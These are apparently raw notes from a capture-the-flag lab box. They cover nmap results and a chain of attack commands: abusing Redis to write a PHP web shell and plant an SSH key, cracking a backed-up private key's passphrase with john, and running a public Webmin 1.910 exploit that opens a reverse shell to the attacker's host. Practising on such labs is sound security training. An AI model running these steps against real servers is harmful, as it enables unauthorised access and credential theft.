PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)
|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)
|_  256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: E234E3E8040EFB1ACD7028330A956EBF
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: The Cyber Geek's Personal Website
6379/tcp  open  redis   Redis key-value store 4.0.9
10000/tcp open  http    MiniServ 1.910 (Webmin httpd)
|_http-favicon: Unknown favicon MD5: 91549383E709F4F1DD6C8DAB07890301
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel




![](2021-02-24-13-51-27.png)

![](2021-02-24-13-51-35.png)

![](2021-02-24-13-54-00.png)



https://github.com/roughiz/Webmin-1.910-Exploit-Script


redis-cli -h 10.10.10.160 -p 6379 ping
PONG



10.10.10.160:6379> CONFIG GET databases
1) "databases"
2) "16"
10.10.10.160:6379> INFO keyspace
# Keyspace



no data in redis?



![](2021-02-24-14-14-56.png)


10.10.10.160:6379> config set dir /var/www/html/
OK
10.10.10.160:6379> config set dir /var/www/html/upload/
OK
10.10.10.160:6379> config set dbfilename redis.php
OK
10.10.10.160:6379> set test1 "<?php system($_REQUEST['cmd]); ?>"
OK
10.10.10.160:6379> save
(error) ERR



10.10.10.160:6379> config set dir /tmp/
OK
10.10.10.160:6379> config set dbfilename redis.php
OK
10.10.10.160:6379> set test1 "<?php system($_REQUEST['cmd]); ?>"
OK
10.10.10.160:6379> save
OK



config set dir /var/lib/redis/.ssh

ssh-keygen -t rsa

(echo -e "\n\n"; cat .id_rsa.pub; echo -e "\n\n") > foo.txt


cat foo.txt | redis-cli -h 10.10.10.160 -x set crackit


ssh -i id_rsa redis@10.10.10.160



/var/lib/redis/6379/dump.rdb

/webmin-setup.out


/var/log/redis/redis-server.log

-rwxr-xr-x 1 Matt Matt 1743 Aug 26  2019 /opt/id_rsa.bak


/etc/redis/redis.conf


/usr/share/john/ssh2john.py matt-rsa > matt-rsa.hash

john --wordlist=~/htb/rockyou.txt matt-rsa.hash 

computer2008     (matt-rsa)




kali@kali:~/htb/boxes/10.10.10.160$ ssh -i matt-rsa Matt@10.10.10.160
Enter passphrase for key 'matt-rsa': 
Connection closed by 10.10.10.160 port 22



su - Matt


Webmin:
Matt:computer2008
https://10.10.10.160:10000/sysinfo.cgi?xnavigation=1




use the webmin exploit from before:

python webmin_exploit.py --rhost 10.10.10.160 --lhost 10.10.14.8 --lport 1234 -u Matt -p computer2008 -s true

![](2021-02-24-15-24-45.png)